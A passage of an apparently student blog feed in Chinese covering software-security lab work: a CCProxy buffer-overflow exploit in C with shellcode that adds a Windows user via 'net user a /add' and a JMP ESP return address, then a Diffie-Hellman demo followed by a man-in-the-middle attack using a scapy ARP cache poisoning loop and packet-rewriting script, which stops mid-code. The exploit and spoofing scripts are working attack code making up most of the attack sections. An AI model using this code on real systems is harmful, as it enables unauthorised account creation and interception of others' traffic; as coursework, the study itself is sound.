class="number">-0</span>dh],<span class="number">20</span>h;空格</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0</span>ch],<span class="number">75</span>h;u</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0b</span>h],<span class="number">73</span>h;s</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0</span>ah],<span class="number">65</span>h;e</span><br><span class="line">            mov byte ptr [ebp<span class="number">-09</span>h],<span class="number">72</span>h;r</span><br><span class="line">            mov byte ptr [ebp<span class="number">-08</span>h],<span class="number">20</span>h;空格</span><br><span class="line">            mov byte ptr [ebp<span class="number">-07</span>h],<span class="number">61</span>h;a</span><br><span class="line">            mov byte ptr [ebp<span class="number">-06</span>h],<span class="number">20</span>h;空格</span><br><span class="line">            mov byte ptr [ebp<span class="number">-05</span>h],<span class="number">2f</span>h;/</span><br><span class="line">            mov byte ptr [ebp<span class="number">-04</span>h],<span class="number">61</span>h;a</span><br><span class="line">            mov byte ptr [ebp<span class="number">-03</span>h],<span class="number">64</span>h;d</span><br><span class="line">            mov byte ptr [ebp<span class="number">-02</span>h],<span class="number">64</span>h;d</span><br><span class="line">            lea eax,[ebp<span class="number">-10</span>h] ;</span><br><span class="line">            push eax ;串地址作为参数入栈</span><br><span class="line">            mov eax, <span class="number">0x77bf93c7</span>;</span><br><span class="line">            call eax ;调用system</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后反汇编得到汇编代码，在memory中可以查看到汇编语句在内存中的机器码表示，由于程序已经加载了msvcrt.dll库文件，因此我们这里只需要shellcode的机器码即可，观察汇编代码块中语句的起始地址为01001782（push ebp），结束地址为call命令所在地址，在memory中查找该地址对应的机器码即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626220413.png" alt="Shellcode对应机器码" style="zoom:50%;" /></p>
<p>接下来利用缓冲区的溢出来执行shellcode，上述所得在第1012个字节处发生溢出，因此我们需要执行“JMP ESP”指令就需要将该指令的地址填入1013-1016字节，及为上述的00514C6E。当执行完该指令后就会跳转到已经经过变化的ESP处，此时的ESP执行地址应该为1013+0xC+0x4个字节；这里由于CCProxy会有一个字符串的覆盖操作，将第5个字节到1012个字节复制到1013+0xC+0x4字节处，所以我们的shellcode需要放在第5个字节到第1012个字节之间。</p>
<p>本机与CCPROXY 的连接是TCP连接，首先需要编写程序以TELNET的形式登陆到 CCPROXY 上，即建立TCP连接，去连接 CCPROXY 的23号端口，一旦连接建立好了后， 便可以发送 TCP 报文，报文的内容是ping主机名\r\n ，主机名便填写上文提到的超长的字符串进行溢出。注入 shellcode 后执行7FFA4512 即 JMP ESP。字符串的前 4 个字节为无用的字节，从第五个字节开始便可以用来写 ShellCode，构造的ping主机名应当如下：4 个字节的无用指令+ShellCode（最多可以从第5个字节到1012个字节）+jmp esp（第1013个字节到第 1016个）+最后的填充字节。</p>
<p>编写的C语言代码及shellcode机器码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;MSWSock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LEN 2000</span></span><br><span class="line"><span class="keyword">char</span> shell[] =<span class="string">&quot;\x55\x8b\xec\x33\xff\x57\x83\xec &quot;</span></span><br><span class="line">              <span class="string">&quot;\x0c\xc6\x45\xf0\x6e\xc6\x45\xf1 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x65\xc6\x45\xf2\x74\xc6\x45\xf3 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x20\xc6\x45\xf4\x75\xc6\x45\xf5 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x73\xc6\x45\xf6\x65\xc6\x45\xf7 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x72\xc6 x45\xf8\x20\xc6\x45\xf9 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x61\xc6 x45\xfa\x20\xc6\x45\xfb &quot;</span></span><br><span class="line">              <span class="string">&quot;\x2f\xc6\x45\xfc\x61\xc6\x45\xfd &quot;</span></span><br><span class="line">              <span class="string">&quot;\x64\xc6\x45\xfe\x64\x8d\x45\xf0 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x50\xb8\xc7\x93\xbf\x77\xff\xd0 &quot;</span>;<span class="comment">//shellcode机器码</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WSADATA ws;<span class="comment">//初始化ws</span></span><br><span class="line">    <span class="keyword">int</span> ret = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;ws);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line">    sa.sin_family = AF_INET;</span><br><span class="line">    sa.sin_port = htons(<span class="number">23</span>);</span><br><span class="line">    sa.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LEN];</span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">1024</span>];</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">    buf[<span class="number">3</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">    buf[<span class="number">4</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">int</span> l = <span class="built_in">strlen</span>(shell);</span><br><span class="line">    buf[<span class="number">5</span>] = buf[<span class="number">6</span>] = buf[<span class="number">7</span>] = buf[<span class="number">8</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="comment">//前4个字节为无用字节</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">9</span>; j &lt; <span class="number">9</span> + l; j++)</span><br><span class="line">        buf[j] = shell[j - <span class="number">9</span>];</span><br><span class="line">    <span class="comment">//插入shellcode</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">9</span> + l; i &lt; <span class="number">1012</span> + <span class="number">5</span>; i++)</span><br><span class="line">        buf[i] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="comment">//到溢出点为止都填入无用字节</span></span><br><span class="line">    buf[<span class="number">1017</span>] = <span class="number">0x6E</span>;</span><br><span class="line">    buf[<span class="number">1018</span>] = <span class="number">0x4C</span>;</span><br><span class="line">    buf[<span class="number">1019</span>] = <span class="number">0x51</span>;</span><br><span class="line">    buf[<span class="number">1020</span>] = <span class="number">0x00</span>;</span><br><span class="line">    <span class="comment">//这里为JMP ESP的地址，00514C6E</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1021</span>; i &lt; <span class="number">1998</span>; i++)</span><br><span class="line">        buf[i] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    buf[<span class="number">1998</span>] = <span class="string">&#x27;\r&#x27;</span>;</span><br><span class="line">    buf[<span class="number">1999</span>] = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="comment">//命令结束回车换行</span></span><br><span class="line">    <span class="comment">//创建Socket</span></span><br><span class="line">    SOCKET sc = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//连接到服务器</span></span><br><span class="line">    ret = connect(sc, (<span class="keyword">const</span> sockaddr*)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    recv(sc, buf1, <span class="number">1024</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//接收服务器端的回答</span></span><br><span class="line">    ret = send(sc, buf, <span class="number">2000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//发送攻击数据</span></span><br><span class="line">    closesocket(sc);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后运行CCproxy，再次执行上面的代码会发现CCProxy发生了溢出崩溃，理论上来说，代码成功执行会在系统中添加一个名为a的用户，在CMD窗口下利用net user指令查看用户状况可以发现已经成功添加，shellcode正确执行。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626220545.png" alt="用户添加成功"  /></p>
<p>至此，利用简单的溢出漏洞来实现添加用户的功能已经完成。</p>
<hr>
<div class="note pink icon simple"><i class="note-icon fas fa-car-crash"></i><p><strong>$ps:$这是软件安全第二次实验的内容，最近的病毒实验实在太烧脑，希望后续能将这一部分完整记录下来！</strong></p>
</div>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/05AE3B62.gif" alt="img"></p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>基于DH密钥协商的中间人攻击</title>
    <url>/2021/06/19/%E5%9F%BA%E4%BA%8EDH%E5%AF%86%E9%92%A5%E5%8D%8F%E5%95%86%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<hr>
<h1 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h1><p>先来张图介绍一下$Diffie-Hellman$算法的基本原理，当然，这里使用的是教科书上的DH交换算法，在实际应用中并不会如此简单。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210619203314.png" alt="alt DH交换算法"></p>
<p>基于之前学过的西南数学中的基本原理，$Alice$与$Bob$之间共享的是大素数$p$与对应乘法群$Z_p^*$的一个本原元$g$，$Alice$向$Bob$发送自己的$A=g^a$，同时$Bob$向$Alice$发送自己的$B=g^b$，这样二者都可以计算出密钥$K=g^{ab}\ mod \ p$,对应的破解难题是离散对数问题。</p>
<hr>
<h1 id="简单DH交换的实现"><a href="#简单DH交换的实现" class="headerlink" title="简单DH交换的实现"></a>简单DH交换的实现</h1><h2 id="设计报文格式"><a href="#设计报文格式" class="headerlink" title="设计报文格式"></a>设计报文格式</h2><p>这里简单的设计报文格式为：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">字段</th>
<th style="text-align:center">标志位flag​</th>
<th style="text-align:center">p的位数len_p</th>
<th style="text-align:center">p</th>
<th style="text-align:center">g的位数len_g</th>
<th style="text-align:center">g</th>
<th style="text-align:center">计算数（如A)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">长度</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">len_p</td>
<td style="text-align:center">1</td>
<td style="text-align:center">len_g</td>
<td style="text-align:center">不定</td>
</tr>
</tbody>
</table>
</div>
<p>在下面的代码中，由字符串的长度减去$flag、p、g$等可以计算出计算数的位数，数据包基于UDP协议进行实现。这里由$HostA$主机扮演$Alice$，由$Server2$主机扮演$Bob$，而由$HostM$主机扮演接下来任务中的中间人，相关主机的$IP$地址及$MAC$地址见下表：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">主机名</th>
<th style="text-align:center">HostA</th>
<th style="text-align:center">HostM</th>
<th style="text-align:center">Server2</th>
<th style="text-align:center">网关</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">IP地址</td>
<td style="text-align:center">192.168.60.2</td>
<td style="text-align:center">192.168.60.3</td>
<td style="text-align:center">10.0.2.7</td>
<td style="text-align:center">192.168.60.1</td>
</tr>
<tr>
<td style="text-align:center">MAC地址</td>
<td style="text-align:center">02:42:c0:a8:3c:02</td>
<td style="text-align:center">02:42:c0:a8:3c:03</td>
<td style="text-align:center">02:42:0a:00:02:07</td>
<td style="text-align:center">02:42:90:9b:17:90</td>
</tr>
</tbody>
</table>
</div>
<h2 id="HostA-与-Server2-的DH通信实现"><a href="#HostA-与-Server2-的DH通信实现" class="headerlink" title="$HostA$与$Server2$的DH通信实现"></a>$HostA$与$Server2$的DH通信实现</h2><p>代码如下($HostA$为$client$端，$Server2$为$Server$端):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Client端</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cal</span>(<span class="params">a,rand,p</span>):</span></span><br><span class="line">    cal = (a**rand) % p</span><br><span class="line">    <span class="keyword">return</span> cal</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>(<span class="params">di,mi,p</span>):</span></span><br><span class="line">    key = (di ** mi ) % p</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  udp_client=socket(AF_INET,SOCK_DGRAM)</span><br><span class="line">  len_p=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input Length of P:&quot;</span>))</span><br><span class="line">  len_g=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input Length of g:&quot;</span>))</span><br><span class="line">  p=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input the P:&quot;</span>))</span><br><span class="line">  g=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input the g:&quot;</span>))</span><br><span class="line">  A=<span class="number">101</span></span><br><span class="line">  Ya=get_cal(g,A,p)</span><br><span class="line">  msg=<span class="string">&quot;0&quot;</span>+<span class="built_in">str</span>(len_p)+<span class="built_in">str</span>(p)+<span class="built_in">str</span>(len_g)+<span class="built_in">str</span>(g)+<span class="built_in">str</span>(Ya)</span><br><span class="line">  udp_client.sendto(msg.encode(<span class="string">&#x27;utf-8&#x27;</span>),(<span class="string">&#x27;10.0.2.7&#x27;</span>,<span class="number">9010</span>))</span><br><span class="line">  key=<span class="number">0</span></span><br><span class="line">  data,addr = udp_client.recvfrom(<span class="number">1024</span>)</span><br><span class="line">  <span class="built_in">print</span>(data)</span><br><span class="line">  <span class="built_in">print</span>(addr)</span><br><span class="line">  <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span> :</span><br><span class="line">         Yb_str=<span class="string">&quot;&quot;</span></span><br><span class="line">         len_msg=<span class="built_in">len</span>(data)</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+len_g+<span class="number">3</span>,len_msg):</span><br><span class="line">             Yb_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">         Yb=<span class="built_in">int</span>(Yb_str)</span><br><span class="line">         Key=get_key(Yb,A,p)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;The Key is %d &quot;</span>,Key)</span><br><span class="line">  <span class="keyword">else</span> :</span><br><span class="line">         udp_client.sendto(msg,(<span class="string">&#x27;10.0.2.7&#x27;</span>,<span class="number">9010</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Server端</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cal</span>(<span class="params">a,rand,p</span>):</span></span><br><span class="line">    cal = (a**rand) % p</span><br><span class="line">    <span class="keyword">return</span> cal</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>(<span class="params">di,mi,p</span>):</span></span><br><span class="line">    key = (di ** mi ) % p</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   udp_srv=socket(AF_INET,SOCK_DGRAM)</span><br><span class="line">   udp_srv.bind((<span class="string">&#x27;10.0.2.7&#x27;</span>,<span class="number">9010</span>))</span><br><span class="line">   B=<span class="number">89</span></span><br><span class="line">   p_str=<span class="string">&quot;&quot;</span></span><br><span class="line">   g_str=<span class="string">&quot;&quot;</span></span><br><span class="line">   Ya_str=<span class="string">&quot;&quot;</span></span><br><span class="line">   data,addr=udp_srv.recvfrom(<span class="number">1024</span>)</span><br><span class="line">   <span class="built_in">print</span>(data)</span><br><span class="line">   <span class="built_in">print</span>(addr)</span><br><span class="line">   <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         len_p=<span class="built_in">int</span>(data[<span class="number">1</span>])</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,len_p+<span class="number">2</span>):</span><br><span class="line">             p_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">         p=<span class="built_in">int</span>(p_str)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;The received P is %d&quot;</span>,p)</span><br><span class="line">         len_g=<span class="built_in">int</span>(data[len_p+<span class="number">2</span>])</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+<span class="number">3</span>,len_p+len_g+<span class="number">3</span>):</span><br><span class="line">             g_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">         g=<span class="built_in">int</span>(g_str)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;The received g is %d&quot;</span>,g)</span><br><span class="line">         len_msg=<span class="built_in">len</span>(data)</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+len_g+<span class="number">3</span>,len_msg):</span><br><span class="line">             Ya_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">         Ya=<span class="built_in">int</span>(Ya_str)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;The received Ya is %d&quot;</span>,Ya)</span><br><span class="line">         Yb=get_cal(g,B,p)</span><br><span class="line">         msg=<span class="string">&quot;1&quot;</span>+<span class="built_in">str</span>(len_p)+<span class="built_in">str</span>(p)+<span class="built_in">str</span>(len_g)+<span class="built_in">str</span>(g)+<span class="built_in">str</span>(Yb)</span><br><span class="line">         udp_srv.sendto(msg,addr)</span><br><span class="line">         Key=get_key(Ya,B,p)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;The key is : %d&quot;</span>,Key)</span><br><span class="line">   <span class="keyword">else</span> :</span><br><span class="line">         msg=<span class="string">&quot;Error!&quot;</span></span><br><span class="line">         udp_srv.sendto(msg,addr)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>相关的过程及解释见下面的实验截图：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210618002652.png" alt="alt 1"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210618002823.png" alt="alt 2"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619152958.png" alt="alt 3"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619153112.png" alt="alt 4"></p>
<hr>
<h1 id="HostM-介入中间人进行攻击"><a href="#HostM-介入中间人进行攻击" class="headerlink" title="$HostM$介入中间人进行攻击"></a>$HostM$介入中间人进行攻击</h1><p>基于上次实验中的$ARP$缓存攻击，先造成$Alice$和$Bob$的$ARP$中毒，使得他们发送的包都会被$HostM$进行拦截并对内容加以修改后再发送包出去即可，$ARP$缓存中毒的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ARP缓存中毒攻击</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Machine A&#x27;s informaton</span></span><br><span class="line">IP_A  = <span class="string">&quot;192.168.60.2&quot;</span></span><br><span class="line">MAC_A = <span class="string">&quot;02:42:c0:a8:3c:02&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Machine B&#x27;s informaton</span></span><br><span class="line">IP_B  = <span class="string">&quot;192.168.60.1&quot;</span></span><br><span class="line">MAC_B = <span class="string">&quot;02:42:90:9b:17:90&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Attacker Machine&#x27;s informaton</span></span><br><span class="line">IP_M  = <span class="string">&quot;192.168.60.3&quot;</span></span><br><span class="line">MAC_M = <span class="string">&quot;02:42:c0:a8:3c:03&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SENDING SPOOFED ARP REPLY.........&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct spoofed ARP sent to machine A</span></span><br><span class="line">ether1     = Ether()</span><br><span class="line">ether1.dst = MAC_A</span><br><span class="line">arp1       = ARP()</span><br><span class="line">arp1.psrc  = IP_B</span><br><span class="line">arp1.hwsrc = MAC_M</span><br><span class="line">arp1.pdst  = IP_A</span><br><span class="line">arp1.op    = <span class="number">1</span> </span><br><span class="line">frame1     = ether1/arp1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct spoofed ARP sent to machine B</span></span><br><span class="line">ether2      = Ether()</span><br><span class="line">ether2.dst  = MAC_B</span><br><span class="line">arp2        = ARP()</span><br><span class="line">arp2.psrc   = IP_A</span><br><span class="line">arp2.hwsrc  = MAC_M</span><br><span class="line">arp2.pdst   = IP_B</span><br><span class="line">arp2.op     = <span class="number">1</span> </span><br><span class="line">frame2      = ether2/arp2</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">   sendp(frame1) </span><br><span class="line">   sendp(frame2) </span><br><span class="line">   sleep(<span class="number">5</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>$ARP\ $缓存中毒攻击是持续的，在攻击的过程中需要将$HostM\ $上的$IP$转发关闭，再运行嗅探并修改报文的代码，这一部分代码基于上一次实验中对$Netcat$攻击的代码，在其基础上进行修改即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Machine A&#x27;s informaton</span></span><br><span class="line">IP_A  = <span class="string">&quot;192.168.60.2&quot;</span></span><br><span class="line">MAC_A = <span class="string">&quot;02:42:c0:a8:3c:02&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Machine B&#x27;s informaton</span></span><br><span class="line"><span class="comment"># treat Gateway as Machine B</span></span><br><span class="line">IP_B  = <span class="string">&quot;192.168.60.1&quot;</span></span><br><span class="line">MAC_B = <span class="string">&quot;02:42:90:9b:17:90&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Server2&#x27;s information</span></span><br><span class="line">IP_Server2 = <span class="string">&quot;10.0.2.7&quot;</span></span><br><span class="line">MAC_Server2 = <span class="string">&quot;02:42:0a:00:02:07&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Attacker Machine&#x27;s informaton</span></span><br><span class="line">IP_M  = <span class="string">&quot;192.168.60.3&quot;</span></span><br><span class="line">MAC_M = <span class="string">&quot;02:42:c0:a8:3c:03&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cal</span>(<span class="params">a,rand,p</span>):</span></span><br><span class="line">    cal = (a**rand) % p</span><br><span class="line">    <span class="keyword">return</span> cal</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>(<span class="params">di,mi,p</span>):</span></span><br><span class="line">    key = (di ** mi ) % p</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spoof_pkt</span>(<span class="params">pkt</span>):</span></span><br><span class="line">    s=<span class="number">53</span></span><br><span class="line">    t=<span class="number">67</span></span><br><span class="line">    <span class="keyword">if</span> pkt.haslayer(IP):</span><br><span class="line">        <span class="keyword">if</span> pkt.src == MAC_A <span class="keyword">and</span> pkt.dst == MAC_M:</span><br><span class="line">            pkt.src = MAC_M</span><br><span class="line">            pkt.dst = MAC_B</span><br><span class="line">            <span class="keyword">del</span> pkt[IP].chksum</span><br><span class="line">            <span class="keyword">del</span> pkt[UDP].chksum</span><br><span class="line">            <span class="keyword">if</span> pkt.haslayer(UDP) <span class="keyword">and</span> pkt[UDP].payload:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Packet is from A&quot;</span>)</span><br><span class="line">                p_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                g_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                Ya_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                data = pkt[UDP].payload.load</span><br><span class="line">                len_p=<span class="built_in">int</span>(data[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,len_p+<span class="number">2</span>):</span><br><span class="line">                      p_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                p=<span class="built_in">int</span>(p_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received P is :&quot;</span>,p)</span><br><span class="line">                len_g=<span class="built_in">int</span>(data[len_p+<span class="number">2</span>])</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+<span class="number">3</span>,len_p+len_g+<span class="number">3</span>):</span><br><span class="line">                      g_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                g=<span class="built_in">int</span>(g_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received g is :&quot;</span>,g)</span><br><span class="line">                len_msg=<span class="built_in">len</span>(data)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+len_g+<span class="number">3</span>,len_msg):</span><br><span class="line">                      Ya_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                Ya=<span class="built_in">int</span>(Ya_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received Ya is :&quot;</span>,Ya)</span><br><span class="line">                Yt=get_cal(g,t,p)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Yt with B is:&quot;</span>,Yt)</span><br><span class="line">                newdata=<span class="string">&quot;0&quot;</span>+<span class="built_in">str</span>(len_p)+<span class="built_in">str</span>(p)+<span class="built_in">str</span>(len_g)+<span class="built_in">str</span>(g)+<span class="built_in">str</span>(Yt)</span><br><span class="line">                newdata = newdata.encode()</span><br><span class="line">                Key_A=get_key(Ya,s,p)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Key with A is:&quot;</span>,Key_A)</span><br><span class="line">                newpkt = pkt</span><br><span class="line">                <span class="keyword">del</span>(newpkt[IP].<span class="built_in">len</span>)</span><br><span class="line">                <span class="keyword">del</span>(newpkt[UDP].payload)</span><br><span class="line">                sendp(newpkt/newdata)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> pkt.src == MAC_B <span class="keyword">and</span> pkt.dst == MAC_M:</span><br><span class="line">            pkt.src = MAC_M</span><br><span class="line">            pkt.dst = MAC_A</span><br><span class="line">            <span class="keyword">del</span> pkt[IP].chksum</span><br><span class="line">            <span class="keyword">del</span> pkt[UDP].chksum</span><br><span class="line">            <span class="keyword">if</span> pkt.haslayer(UDP) <span class="keyword">and</span> pkt[UDP].payload:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Packet is from Server2:&quot;</span>)</span><br><span class="line">                p_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                g_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                Yb_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                data = pkt[UDP].payload.load</span><br><span class="line">                len_p=<span class="built_in">int</span>(data[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,len_p+<span class="number">2</span>):</span><br><span class="line">                      p_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                p=<span class="built_in">int</span>(p_str)</span><br><span class="line">                <span 